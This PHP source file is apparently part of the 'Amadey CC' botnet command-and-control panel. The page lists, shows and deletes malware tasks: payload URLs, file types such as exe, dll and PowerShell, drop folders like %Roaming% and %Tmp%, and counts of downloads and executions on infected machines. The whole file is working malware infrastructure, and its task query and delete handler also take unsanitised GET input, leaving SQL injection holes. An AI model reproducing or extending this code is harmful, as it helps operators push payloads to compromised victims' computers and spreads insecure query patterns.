<?php

   session_start();

   if ($_GET["delete"])
   {
      include("Functions.php");
      include("Cfg/Config.php");

      if (!is_numeric($_GET['id'])) 
      header("Location: " . $_SERVER['HTTP_REFERER'] . "");

      if ($_SESSION['Name'] != $conf["observer_login"]) 
      {
         DeleteTask($_GET['id']);
         echo "<meta http-equiv=\"refresh\" content=\"0; url=Show_Tasks.php\">"; 
      }
      else
      {
         include("Header.php");

         echo "<table border=\"0\" width=\"100%\" height=\"300\">
                  <tr>
                     <td>
                        <div align = center>" . $lang["00882"] . "</div>
                     </td>
                  </tr>
              </table>";

         include("Footer.php");
      }

      exit();
   }

   if ($_GET["show"])
   {
      include("Cfg/Config.php");
      include("Cfg/Lang.php");
      include("Functions.php");
      
      echo "<html>
               <head>	
                  <title>Amadey CC</title>	
                  <link rel=\"stylesheet\" type=\"text/css\" href=\"Css\Main.css\">	
                  <link rel=\"stylesheet\" type=\"text/css\" href=\"Css\Style.css\">	
                  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">
               </head>";

      sTable();

      $link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link, $conf['dbname']);
      $result = mysqli_query($link, "SELECT * FROM tasks WHERE `tid` = '" . $_GET["show"] . "' ORDER BY id DESC");

      echo "<div align = center> 
               <table cellpadding = 1 cellspacing = 1 width = \"98%\" class = table style = \"border: 1px solid;\">
                  <tr>                       
                     <td><div align = center>" . $lang["0006"] . ":</div></td>              
                     <td><div align = center>" . $lang["0053"] . ":</div></td>
                     <td><div align = center>" . $lang["0054"] . ":</div></td>
                     <td><div align = center>" . $lang["0055"] . ":</div></td>
                     <td><div align = center>" . $lang["0056"] . ":</div></td>
                     <td><div align = center>" . $lang["0060"] . ":</div></td> 
                     <td><div align = center>" . $lang["0045"] . ":</div></td> 
                     <td><div align = center>" . $lang["0046"] . ":</div></td> 
                     <td><div align = center>" . $lang["0047"] . ":</div></td> 
                     <td><div align = center>" . $lang["0048"] . ":</div></td>
                     <td><div align = center>" . $lang["0049"] . ":</div></td>
                     <td><div align = center>" . $lang["0050"] . ":</div></td>";
                  echo "</tr>";
                  
      while ($row = mysqli_fetch_array($result))
      {      
         $tid = $row['tid'];
         $url_0 = $row['path'];
         $url_1 = $row['path'];
         $done = $row['loads'];
         $good = $row['exec'];
         $d_err = $row['error'];
         $l_err = $row['error2'];
         $needs = $row['tlimit']; 
         $progress = round(($done/$needs) * 100,1);
         $success = round(($good/$needs) * 100,1);

         if ($row['arc'] == 2)
         {
            $arc = $lang["0066"];
         }

         if ($row['arc'] == 0)
         {
            $arc = "x32";
         }

         if ($row['arc'] == 1)
         {
            $arc = "x64";
         }

         if ($row['filetype'] == 0 || $row['filetype'] == 5)
         {
            $filetype = $lang["0067"];
         }

         if ($row['filetype'] == 1 || $row['filetype'] == 6)
         { 
            $filetype = $lang["0069"];
         }

         if ($row['filetype'] == 2 || $row['filetype'] == 7)
         {
            $filetype = $lang["0070"];
         }

         if ($row['filetype'] == 3)
         {
            $filetype = $lang["0068"];
         }

         if ($row['filetype'] == 4)
         {
            $filetype = $lang["00702"];
         }

         if ($row['filetype'] == 8)
         {
            $filetype = $lang["00710"];
         }

         if ($row['filetype'] == 9)
         {
            $filetype = $lang["0071"];
         }

         if ($row['folder'] == 0)
         {
            $folder = "%Roaming%";
         }

         if ($row['folder'] == 1)
         {
            $folder = "%Tmp%";
         }

         if ($row['folder'] == 2)
         {
            $folder = "%Profile%";
         }

         if ($row['folder'] == 3)
         {
            $folder = "%Desktop%";
         }

         if ($row['filetype'] == 3)
         {
            $folder = $lang["0068"];
         }

         if ($row['tlimit'] == "")
         {
            $needs = "*";
         }
         else
         {
            $needs = $row['tlimit'];
         }

         if ($row['units'] == "")
         {
            $units = "*";
         }
         else
         {
            $units = $row['units'];
         }
      
         if (strpos($url_0, ":::"))
         {
            $url_0 = substr($url_0, 0, strpos($url_0, ":::"));
         }

         if (strpos($url_1, ":::"))
         {
            $url_1 = substr($url_1, 0, strpos($url_1, ":::"));
         }

         if (strlen($url_1) > 32)
         {
            $url_1 = substr($url_1, 0, 32) . "...";  
         }

         $gb = GetBG();

         echo "<tr height=\"80\">";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $units . "</div></td>";
            echo "<td bgcolor = " . $gb . ">" . "<div align = left>" . "<img src=\"Images\Inf_Ico.png\"> " . "<a href=\"" . $url_0 . "\">" . $url_1 . "</a>" . "</div>" . "</td>";
            echo "<td bgcolor = " . $gb . ">" . "<img src=\"Images\Inf_Ico.png\"> " . $filetype . "</td>";
            echo "<td bgcolor = " . $gb . ">" . "<img src=\"Images\Inf_Ico.png\"> " . $arc . "</td>";
            echo "<td bgcolor = " . $gb . ">" . $folder . "</td>";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $needs . "</div></td>";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $done . "</div></td>";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $good . "</div></td>";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $d_err . "</div></td>";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $l_err . "</div></td>";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $progress . "%" . "</div></td>";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $success . "%" . "</div></td>";
         echo "</tr>";
      }

      echo "      </table>
               </div>
            </html>";

      mysqli_close($link);
      exit;
   }

   if (!(isset($_SESSION['Name'])))
   {
      header("Location: Login.php");
      exit;
   }

   include("Header.php");
   include("Cfg/Config.php");
   include("Cfg/Lang.php");
   include("Functions.php");

   CheckSQL();

   echo "<table cellpadding=0 cellspacing=0 width=\"100%\" style =\"border: 0px solid;\">
         <tr style=background-color:#11101d; height=\"50\">
            <td>
               <div align = center>
                  <font color=\"#E4E9F7\">" . $lang["_001"] . $_SESSION['Name'] . $lang["_006"] . GetTaskCount() . $lang["_007"] .
                  "</font>
               </div>
            </td>
         </tr>
         <tr>
            <td>
               <img src=\"Images\Ang.png\" align=\"top\"></img>
            </td>
         </tr>
      </table>";


   if (GetTaskCount() != "0")
   {
      $link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);	
      $result = mysqli_query($link, "SELECT * FROM tasks ORDER BY id DESC");

      echo "<div align = center> 
            <table cellpadding = 1 cellspacing = 1 width = \"98%\" class = table style = \"border: 1px solid;\">
               <tr>                       
                  <td><div align = center></div></td>
                  <td><div align = center>" . $lang["0040"] . ":</div></td>                               
                  <td><div align = center>" . $lang["0044"] . ":</div></td>
                  <td><div align = center>" . $lang["0045"] . ":</div></td> 
                  <td><div align = center>" . $lang["0046"] . ":</div></td> 
                  <td><div align = center>" . $lang["0047"] . ":</div></td> 
                  <td><div align = center>" . $lang["0048"] . ":</div></td>
                  <td><div align = center>".  $lang["0049"] . ":</div></td>
                  <td><div align = center>" . $lang["0050"] . ":</div></td>";

      if ($_SESSION['Name'] != $conf["observer_login"])
      {
         echo "<td><div align = center>" . $lang["0051"] . ":</div></td>";
      }

      echo "</tr>";

      while ($row = mysqli_fetch_array($result))
      {      
         $id = $row['id'];
         $tid = $row['tid'];
         $url_0 = $row['path'];
         $done = $row['loads'];
         $good = $row['exec'];
         $d_err = $row['error'];
         $l_err = $row['error2'];
         $needs = $row['tlimit']; 
         $progress = round(($done/$needs) * 100,1);
         $success = round(($good/$needs) * 100,1);

         if ($row['arc'] == 2)
         {
            $arc = $lang["0066"];
         }

         if ($row['arc'] == 0)
         { 
            $arc = "x32";
         }

         if ($row['arc'] == 1)
         {
            $arc = "x64";
         }

         if ($row['filetype'] == 0 || $row['filetype'] == 5)
         {
            $filetype = $lang["0067"];
            $typeico = "Exe";
         }

         if ($row['filetype'] == 1 || $row['filetype'] == 6)
         {
            $filetype = $lang["0069"];
            $typeico = "Dll";
         }

         if ($row['filetype'] == 2 || $row['filetype'] == 7)
         {
            $filetype = $lang["0070"];
            $typeico = "Cmd";
         }

         if ($row['filetype'] == 3)
         {
            $filetype = $lang["0068"];
            $typeico = "Exe";
         }

         if ($row['filetype'] == 4)
         {
            $filetype = $lang["00702"];
            $typeico = "PS1";
         }

         if ($row['filetype'] == 8)
         {
            $filetype = $lang["00710"];
            $typeico = "Upd";
         }

         if ($row['filetype'] == 9)
         {
            $filetype = $lang["0071"];
            $typeico = "Rem";
         }
      
         if ($row['folder'] == 0)
         {
            $folder = "%Roaming%";
         }

         if ($row['folder'] == 1)
         {
            $folder = "%Tmp%";
         }

         if ($row['folder'] == 2)
         {
            $folder = "%Profile%";
         }

         if ($row['folder'] == 3)
         {
            $folder = "%Desktop%";
         }

         if ($row['tlimit'] == "")
         {
            $needs = "*";
         }
         else
         {
            $needs = $row['tlimit'];
         }

         if ($row['units'] == "")
         {
            $units = "*";
         }
         else  
         {
            $units = $row['units'];
         }

         if ($row['sids'] == "")
         {
            $sids = "*";
         }
         else  
         {
            $sids = $row['sids'];
         }

         $url_1 = $url_0;
               
         if (strpos($url_0, ":::"))
         {
            $url_0 = substr($url_0, 0, strpos($url_0, ":::"));
         }

         if (strpos($url_1, ":::"))
         {
            $url_1 = substr($url_1, 0, strpos($url_1, ":::"));
         }

         if (strlen($url_1) > 32)
         {
            $url_1 = substr($url_1, 0, 32) . "...";  
         }

         $gb = GetBG();

         echo "<tr height=\"80\">";

         echo "<td bgcolor = " . $gb . ">  

         <div align = center><img src=\"Images\Ico_" . $typeico . ".png\"></div>";

         echo "<td bgcolor = " . $gb . ">  
                  <table>
                     <tr><td>" . $lang["0052"] . ":</td><td></td><td>" . $row['comment'] . "</td></tr>
                     <tr><td>" . $lang["0053"] . ":</td><td></td><td>" . "<a href=\"" . $url_0 . "\">" . $url_1 . "</a>" . "</td></tr>
                     <tr><td>" . $lang["0006"] . ":</td><td></td><td>" . $units . "/" . $sids . "</td></tr>
                  </table>
              </td>";

         echo "<td bgcolor = " . $gb . ">
                  <table>
                     <tr><td>" . $lang["0054"] . ":</td><td></td><td>" . $filetype . "</td></tr>
                      <tr><td>" . $lang["0055"] . ":</td><td></td><td>" . $arc . "</td></tr>" ;

                      if ($filetype != $lang["0071"] && $filetype != $lang["00710"] && $filetype != $lang["0068"])
                      {
                         echo "<tr><td>" . $lang["0056"] . ":</td><td></td><td>" . $folder . "</td></tr>";
                      } 

         echo "</table>
            </td>";

         echo "<td bgcolor = " . $gb . "><div align = center>" . $done . $lang["0155"] . $needs . "</div></td>";
         echo "<td bgcolor = " . $gb . "><div align = center>" . $good . "</div></td>";
         echo "<td bgcolor = " . $gb . "><div align = center>" . $d_err . "</div></td>";
         echo "<td bgcolor = " . $gb . "><div align = center>" . $l_err . "</div></td>";
         echo "<td bgcolor = " . $gb . "><div align = center>" . $progress . "%" . "</div></td>";
         echo "<td bgcolor = " . $gb . "><div align = center>" . $success . "%" . "</div></td>";

         if ($_SESSION['Name'] != $conf["observer_login"]) 
         {
            echo "<td bgcolor = " . $gb . ">
                     <table>
                        <tr><td>" . "</td><td></td><td>" . "<button class='buttont' onclick=\"window.location.href = 'Edit_Task.php?id=$id';\">" . $lang["0057"] . "</button>" . "</td></tr>
                        <tr><td>" . "</td><td></td><td>" . "<button class='buttont' onclick=\"window.location.href = 'Show_Tasks.php?show=$tid';\">" . $lang["0058"] . "</button>" . "</td></tr>
                        <tr><td>" . "</td><td></td><td>" . "<button class='buttonr' onclick=\"window.location.href = 'Show_Tasks.php?delete=1&id=$id';\">" . $lang["0059"] . "</button>" . "</td></tr>
                     </table>
                  </td>";       
         }

      echo "</tr>";
      }

      echo "   </table>
            </div>";
   }

   if ($_SESSION['Name'] != $conf["observer_login"]) 
   {
      sTable();
      echo "<div align = center>" . "<button class=\"button\" onclick=\"window.location.href = 'Make_Task.php';\">" . $lang["__05"] . "</button>" . "</a></div>";   
      sTable();
   }

   include("Footer.php");

   mysqli_close($link);

?>